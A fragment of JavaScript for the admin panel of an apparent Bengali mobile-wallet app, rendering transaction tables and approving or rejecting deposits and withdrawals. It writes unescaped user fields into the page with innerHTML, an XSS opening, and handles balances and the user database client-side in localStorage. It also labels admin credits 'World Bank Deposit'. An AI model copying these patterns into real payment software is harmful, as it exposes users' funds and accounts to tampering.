                <td>${t.currency || '৳'} ${formatAmountLocale(t.amount)}</td>
                <td><code>${t.trxId}</code></td>
                <td>
                    <button type="button" onclick="approveTransaction(${t.id})" class="btn-approve">Approve</button>
                    <button type="button" onclick="rejectTransaction(${t.id})" class="btn-reject">Reject</button>
                </td>
            </tr>`;
    });
}

function renderAdminAllHistory() {
    const tbody = document.getElementById('adminAllHistoryTableBody');
    if (!tbody) return;
    tbody.innerHTML = '';
    allTransactions.forEach(t => {
        tbody.innerHTML += `
            <tr>
                <td><b>${t.userName || t.userEmail}</b></td>
                <td>${t.type === 'AdminCredit' ? 'World Bank Deposit' : t.type}</td>
                <td>${t.method}</td>
                <td>${t.currency || '৳'} ${formatAmountLocale(t.amount)}</td>
                <td><code>${t.trxId}</code></td>
                <td>${t.status}</td>
            </tr>`;
    });
}

async function approveTransaction(txId) {
    const txIndex = allTransactions.findIndex(t => t.id === txId);
    if (txIndex === -1) return;
    const tx = allTransactions[txIndex];
    const userIndex = usersDatabase.findIndex(u => u.phone === tx.userEmail);

    if (userIndex !== -1) {
        const targetUser = usersDatabase[userIndex];
        if (!targetUser.balances) targetUser.balances = { ...defaultBalances };
        if (targetUser.totalBalance === undefined) targetUser.totalBalance = 0.00;

        if (['Withdraw', 'TopUp', 'Remittance/Bank'].includes(tx.type)) {
            targetUser.totalBalance -= tx.amount;
        } else if (tx.type === 'Deposit') {
            targetUser.totalBalance += tx.amount;
        }

        usersDatabase[userIndex] = targetUser;
        localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
        saveUserToFirebase(targetUser);

        allTransactions[txIndex].status = 'Approved';
        localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
        saveTxToFirebase(allTransactions[txIndex]);

        showCustomAlert("সফল", 'অ্যাপ্রুভ করা হয়েছে!');
        if (activeUser && activeUser.phone === targetUser.phone) {
            activeUser = targetUser;
            localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
            renderBalances();
        }
        renderAdminPendingList();
        renderAdminUsersList();
        renderAdminAllHistory();
        renderNotificationsList();
    }
}

async function rejectTransaction(txId) {
    const txIndex = allTransactions.findIndex(t => t.id === txId);
    if (txIndex !== -1) {
        allTransactions[txIndex].status = 'Rejected';
        localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
        saveTxToFirebase(allTransactions[txIndex]);
        showCustomAlert("সফল", 'রিজেক্ট করা হয়েছে।');
        renderAdminPendingList();
        renderAdminAllHistory();
        renderNotificationsList();
    }
}
